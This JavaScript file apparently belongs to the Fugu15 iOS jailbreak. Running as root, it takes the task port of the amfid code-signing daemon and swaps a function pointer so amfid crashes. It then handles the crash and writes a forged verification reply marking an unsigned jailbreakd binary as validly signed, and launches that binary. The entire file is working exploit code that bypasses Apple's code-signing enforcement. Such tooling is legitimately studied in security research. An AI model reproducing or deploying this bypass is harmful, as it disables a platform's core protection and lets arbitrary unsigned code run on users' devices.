//
//  runJailbreakd.js
//  Fugu15
//
//  Created by Linus Henze.
//  Copyright © 2021 Linus Henze. All rights reserved.
//

//
// Patch amfid
// Strategy: Replace MIG pointer to verify_code_directory
//           with a pointer to posix_spawnattr_setflags (key A signed, context zero, can use dlsym)
//           This will cause a crash that can be handled
//

log("Hello from JavaScript!");

let amfi_func_entry_off = 0xC588;

let posix_spawnattr_setflags = dlsym("posix_spawnattr_setflags");

let sysctlbyname = CFunc("sysctlbyname");
let uid = CFunc("getuid");
let exit = CFunc("exit");
let proc_pidpath = CFunc("proc_pidpath", Convert.toInt32);
let setsid = CFunc("setsid");
let getenv = CFunc("getenv"); // Don't convert to string
let realpath = CFunc("realpath");

let mach_task_self = CFunc("mach_task_self");
let mach_port_allocate = CFunc("mach_port_allocate", Convert.toInt32);
let mach_port_insert_right = CFunc("mach_port_insert_right", Convert.toInt32);

let vm_read_overwrite = CFunc("vm_read_overwrite", Convert.toInt32);
let vm_write = CFunc("vm_write", Convert.toInt32);
let vm_protect = CFunc("vm_protect", Convert.toInt32);
let vm_allocate = CFunc("vm_allocate", Convert.toInt32);
let vm_deallocate = CFunc("vm_deallocate", Convert.toInt32);

let task_for_pid = CFunc("task_for_pid", Convert.toInt32);
let task_suspend = CFunc("task_suspend", Convert.toInt32);
let task_resume = CFunc("task_resume", Convert.toInt32);
let task_threads = CFunc("task_threads", Convert.toInt32);
let task_info = CFunc("task_info", Convert.toInt32);
let task_set_exception_ports = CFunc("task_set_exception_ports", Convert.toInt32);

let thread_get_state = CFunc("thread_get_state", Convert.toInt32);
let thread_set_state = CFunc("thread_set_state", Convert.toInt32);

let mach_msg_receive = CFunc("mach_msg_receive", Convert.toInt32);
let mach_msg_send = CFunc("mach_msg_send", Convert.toInt32);
let mach_msg = CFunc("mach_msg", Convert.toInt32);

let posix_spawn = CFunc("posix_spawn", Convert.toInt32);
let fork = CFunc("fork");
let sleep = CFunc("sleep");
let kill = CFunc("kill");
let getppid = CFunc("getppid");

let NDR = mem.read64(dlsym("NDR_record"));

let ARM_THREAD_STATE64 = 6;
let ARM_THREAD_STATE64_COUNT = 68;
let ARM_THREAD_STATE64_BYTE_COUNT = ARM_THREAD_STATE64_COUNT * 4;

let TASK_DYLD_INFO = 17;
let TASK_DYLD_INFO_COUNT = 5;
let TASK_DYLD_INFO_BYTE_COUNT = 20;

let VM_PROT_READ = 1;
let VM_PROT_WRITE = 2;
let VM_PROT_EXECUTE = 4;
let VM_PROT_COPY = 0x10;

let MACH_PORT_RIGHT_RECEIVE = 1;
let MACH_MSG_TYPE_MOVE_SEND = 17;
let MACH_MSG_TYPE_MOVE_SEND_ONCE = 18;
let MACH_MSG_TYPE_MAKE_SEND = 20;

let EXCEPTION_DEFAULT = 1;
let EXC_MASK_BAD_ACCESS = 2;

let target_path   = getenv("JAILBREAKD_PATH");
let target_arg    = getenv("JAILBREAKD_ARG");
let target_CDHash = mem.readCString(getenv("JAILBREAKD_CDHASH"));

class ThreadState {
    constructor(buf) {
        this.buf = buf;
        this.reloadState();
    }
    
    reloadState() {
        for (var i = 0; i < 29; i++) {
            this["x" + i] = mem.read64(Add(this.buf, 8 * i));
        }
        
        this.fp = mem.read64(Add(this.buf, 8 * 29));
        this.lr = mem.read64(Add(this.buf, 8 * 30));
        this.sp = mem.read64(Add(this.buf, 8 * 31));
        this.pc = mem.read64(Add(this.buf, 8 * 32));
        this.flagsCPSR = mem.read64(Add(this.buf, 8 * 33));
    }
    
    writeNewState() {
        for (var i = 0; i < 29; i++) {
            mem.write64(Add(this.buf, 8 * i), this["x" + i]);
        }
        
        /*mem.write64(Add(this.buf, 8 * 29), this.fp);
        mem.write64(Add(this.buf, 8 * 30), this.lr);
        mem.write64(Add(this.buf, 8 * 31), this.sp);
        mem.write64(Add(this.buf, 8 * 32), this.pc);
        mem.write64(Add(this.buf, 8 * 33), this.flagsCPSR);*/
    }
}

class Thread {
    constructor(tp) {
        this.tp = tp;
        this.tmpBuf = mem.alloc(8);
    }
    
    toInt64() {
        return this.tp;
    }
    
    getState() {
        if (Thread.buf === undefined) {
            Thread.buf = mem.alloc(ARM_THREAD_STATE64_BYTE_COUNT);
        }
        
        let cnt = this.tmpBuf;
        mem.write64(cnt, ARM_THREAD_STATE64_COUNT);
        let err = thread_get_state(this.tp, ARM_THREAD_STATE64, Thread.buf, cnt);
        if (err != 0) {
            log("thread_get_state failed! ", err);
            return undefined;
        }
        
        let res = new ThreadState(Thread.buf);
        
        return res;
    }
    
    setState(st) {
        st.writeNewState();
        let err = thread_set_state(this.tp, ARM_THREAD_STATE64, st.buf, ARM_THREAD_STATE64_COUNT);
        if (err != 0) {
            log("thread_set_state failed! ", err);
            return undefined;
        }
        
        return ARM_THREAD_STATE64_BYTE_COUNT; // Number of bytes "written"
    }
}

class Task {
    constructor(tp) {
        this.tp = tp;
        this.tmpBuf = mem.alloc(8);
        this.tmpBuf2 = mem.alloc(8);
    }
    
    static forPID(pid) {
        let buf = mem.alloc(8);
        let err = task_for_pid(mach_task_self(), pid, buf);
        if (err == 0) {
            return new Task(mem.read64(buf).low32());
        }
        
        return undefined;
    }
    
    toInt64() {
        return this.tp;
    }
    
    suspend() {
        return task_suspend(this.tp);
    }
    
    resume() {
        return task_resume(this.tp);
    }
    
    threads() {
        let thArrayAddrPtr = this.tmpBuf;
        let countPtr = this.tmpBuf2;
        let err = task_threads(this.tp, thArrayAddrPtr, countPtr);
        if (err != 0) {
            return undefined;
        }
        
        let res = [];
        let thPtr = mem.read64(thArrayAddrPtr);
        let count = mem.read64(countPtr).low32();
        for (var i = 0; i < count; i++) {
            let th = mem.read64(Add(thPtr, i * 4)).low32();
            res.push(new Thread(th));
        }
        
        vm_deallocate(mach_task_self(), thPtr, count * 4);
        
        return res;
    }
    
    read64(addr) {
        mem.write64(this.tmpBuf, 8);
        let err = vm_read_overwrite(this.tp, addr, 8, this.tmpBuf2, this.tmpBuf);
        if (err != 0) {
            return undefined;
        }
        
        return mem.read64(this.tmpBuf2);
    }
    
    read8(addr) {
        mem.write64(this.tmpBuf, 1);
        let err = vm_read_overwrite(this.tp, addr, 1, this.tmpBuf2, this.tmpBuf);
        if (err != 0) {
            return undefined;
        }
        
        return mem.read64(this.tmpBuf2);
    }
    
    write64(addr, val) {
        mem.write64(this.tmpBuf, val);
        let err = vm_write(this.tp, addr, this.tmpBuf, 8);
        if (err != 0) {
            log("Write failed! ", err);
            return undefined;
        }
        
        return 8; // Number of bytes written
    }
    
    write32(addr, val) {
        mem.write64(this.tmpBuf, val);
        let err = vm_write(this.tp, addr, this.tmpBuf, 4);
        if (err != 0) {
            log("Write failed! ", err);
            return undefined;
        }
        
        return 4; // Number of bytes written
    }
    
    write8(addr, val) {
        mem.write64(this.tmpBuf, val);
        let err = vm_write(this.tp, addr, this.tmpBuf, 1);
        if (err != 0) {
            log("Write failed! ", err);
            return undefined;
        }
        
        return 1; // Number of bytes written
    }
    
    protect(addr, len, prot) {
        let err = vm_protect(this.tp, addr, len, Int64.Zero, prot);
        if (err != 0) {
            log("Protect failed! ", err);
            return undefined;
        }
        
        return len; // Number of bytes changed (at least)
    }
    
    alloc(len) {
        let err = vm_allocate(this.tp, this.tmpBuf, len, 1 /* anywhere */);
        if (err != 0) {
            log("vm_allocate failed! ", err);
            return undefined;
        }
        
        return mem.read64(this.tmpBuf);
    }
    
    imageBase() {
        let buf = mem.alloc(TASK_DYLD_INFO_BYTE_COUNT);
        mem.write64(this.tmpBuf, TASK_DYLD_INFO_COUNT);
        var kr = task_info(this.tp, TASK_DYLD_INFO, buf, this.tmpBuf);
        if (kr != 0) {
            return undefined;
        }
        
        let allImageAddr = mem.read64(buf);
        let infoArAddr = this.read64(Add(allImageAddr, 8));
        let start = this.read64(infoArAddr);
        
        return start;
    }
}

function getMachPort() {
    let tmp = mem.alloc(8);
    var err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, tmp);
    if (err != 0) {
        return undefined;
    }
    
    let port = mem.read64(tmp).low32();
    err = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
    if (err != 0) {
        return undefined;
    }
    
    return port;
}

function findAmfi() {
    log("Searching for amfid...");
    let procBuf = mem.alloc(1024 * 5);
    for (var i = 0; i < 0xFFFF; i++) {
        let res = proc_pidpath(new Int64(i), procBuf, 1024);
        if (res > 0) {
            let buf = mem.readCString(procBuf);
            if (buf == "/usr/libexec/amfid") {
                log("Found amfid! PID: ", i);
                log("Attempting to get task port...");
                
                let amfi = Task.forPID(i);
                if (amfi === undefined) {
                    log("Failed to get task port!");
                    break;
                }
                
                log("Got task port for amfid: ", amfi.tp);
                
                log("Getting threads");
                let threads = amfi.threads();
                if (threads === undefined) {
                    log("Failed to get threads!");
                    break;
                }
                
                for (var i = 0; i < threads.length; i++) {
                    log("Thread ", i, ": ", threads[i].tp);
                }
                
                /*let st = threads[0].getState();
                for (var i = 0; i < 29; i++) {
                    log("TH0 x", i, " -> ", st["x" + i]);
                }
                
                log("TH0 fp -> ", st.fp);
                log("TH0 lr -> ", st.lr);
                log("TH0 sp -> ", st.sp);
                log("TH0 pc -> ", st.pc);
                log("TH0 flagsCPSR -> ", st.flagsCPSR);*/
                
                return amfi;
            }
        }
    }
}

var globalAmfiBuf = undefined;

function patchAMFI(amfi, th) {
    // Get crash state
    let st = th.getState();
    log("PC: ", st.pc);
    log("X8: ", st.x8);
    
    log("Getting out message");
    
    // Get out message
    let msg = st.x1;
    
    log("Out message: ", msg);
    
    // Write changes
    amfi.write32(Add(msg, 32), Int64.Zero); // result
    amfi.write32(Add(msg, 36), Int64.One);  // Ents validated
    amfi.write32(Add(msg, 40), Int64.One);  // Sig valid
    amfi.write32(Add(msg, 44), Int64.One);  // Unrestrict
    amfi.write32(Add(msg, 48), Int64.Zero); // Signer type
    amfi.write32(Add(msg, 52), Int64.Zero); // Is aapl
    amfi.write32(Add(msg, 56), Int64.One); // Is dev
    amfi.write32(Add(msg, 60), Int64.Zero); // Anomaly
    
    log("Wrote bits");
    
    // Unsatisfied ents length
    let len = new Int64(0 + 1);
    amfi.write32(Add(msg, 68), len);
    
    log("Wrote unsatisfied ents");
    
    let pad = And(Add(len, 4), new Int64("0xFFFFFFFC"));
    
    let hash = unhexlify(target_CDHash);
    for (var i = 0; i < hash.length; i++) {
        amfi.write8(Add(msg, Add(pad, 72 + i)), hash[i]);
    }
    
    log("Wrote hash");
    
    // Message length
    amfi.write32(Add(msg, 4), Add(pad, 92));
    
    log("Wrote message length");
    
    // NDR
    amfi.write64(Add(msg, 24), NDR);
    
    log("Wrote NDR");
    
    // Now update thread state
    if (globalAmfiBuf === undefined) {
        globalAmfiBuf = amfi.alloc(8);
    }
    
    amfi.write64(globalAmfiBuf, globalAmfiBuf); // Pointer to itself
    
    log("Created buffer");
    
    st.x8 = globalAmfiBuf;
    th.setState(st);
    
    log("Updated thread state");
}

function handleExc(excPort, msgBuf, amfi, cb) {
    log("Waiting for exception message...");
    
    mem.write64(Add(msgBuf, 4), 0x1000); // Size
    mem.write64(Add(msgBuf, 12), excPort); // Local port
    kr = mach_msg_receive(msgBuf);
    if (kr != 0) {
        log("Failed to receive exception message! Err: ", kr);
        exit(-1);
    }
    
    let rmtPort = mem.read64(Add(msgBuf, 8)).low32();
    let id = mem.read64(Add(msgBuf, 20)).low32();
    
    log("Received exception message!");
    
    // Extract thread
    let thread = mem.read64(Add(msgBuf, 28)).low32();
    
    log("Patching amfid...");
    cb(amfi, new Thread(thread));
    
    // Build reply
    // Header
    mem.write64(msgBuf, MACH_MSG_TYPE_MOVE_SEND_ONCE); // bits
    mem.write64(Add(msgBuf, 4), 36); // size
    mem.write64(Add(msgBuf, 8), rmtPort); // remote port
    mem.write64(Add(msgBuf, 12), 0); // local port
    mem.write64(Add(msgBuf, 16), 0); // voucher port
    mem.write64(Add(msgBuf, 20), Add(id, 100)); // id
    
    // NDR
    mem.write64(Add(msgBuf, 24), NDR); // NDR
    
    // result
    mem.write64(Add(msgBuf, 32), 0); // result
    
    kr = mach_msg_send(msgBuf);
    if (kr != 0) {
        log("Failed to send exception reply! Err: ", kr);
        log(mem.read64(Add(msgBuf, 8)));
        exit(-1);
    }
    
    log("Sent reply!");
}

function launchJailbreakd() {
    log("Spawning binary");
    
    let pidBuf = mem.alloc(8);
    let argvBuf = mem.alloc(24);
    mem.write64(argvBuf, target_path);
    mem.write64(Add(argvBuf, 8), target_arg);
    mem.write64(Add(argvBuf, 16), 0);
    
    let res = posix_spawn(pidBuf, target_path, Int64.Zero, Int64.Zero, argvBuf, Int64.Zero);
    log("Spawn returned: ", res);
    if (res == 0) {
        wait(mem.read64(pidBuf).low32());
    }

    return res;
}

log("My UID is " + uid());
if (uid() == 0) {
    log("I'm root!");
} else {
    log("Mhm, not root?");
    exit(-1);
}

// Force launching amfid
let res = launchJailbreakd();
if (res == 0) {
    log("Jailbreakd already trusted. I'm done here.");
    exit(0xFF);
}

let amfi = findAmfi();
if (amfi !== undefined) {
    log("Setting exception port");
    
    let excPort = getMachPort();
    if (excPort === undefined) {
        log("Failed to allocate a mach port!");
        exit(-1);
    }
    
    var kr = task_set_exception_ports(amfi.tp, EXC_MASK_BAD_ACCESS, excPort, EXCEPTION_DEFAULT, 0);
    if (kr != 0) {
        log("Failed to set exception port!");
        exit(-1);
    }
    
    let base = amfi.imageBase();
    let target = Add(base, amfi_func_entry_off);
    log("Image Base: ", base);
    log("Target: ", target);
    
    let targetBackup = amfi.read64(target);
    amfi.protect(target, 8, VM_PROT_READ | VM_PROT_WRITE | VM_PROT_COPY);
    amfi.write64(target, posix_spawnattr_setflags);
    /*if (amfi.read64(target) != posix_spawnattr_setflags) {
        log("Failed to set target!");
        break;
    }*/
    
    log("Changed target");
    
    setsid();
    
    let p = fork();
    if (p == 0) {
        launchJailbreakd();
        
        exit(-1);
    }
    
    var msgBuf = mem.alloc(0x1000);
    handleExc(excPort, msgBuf, amfi, patchAMFI);
    amfi.write64(target, targetBackup);
}

log("JavaScript done!");
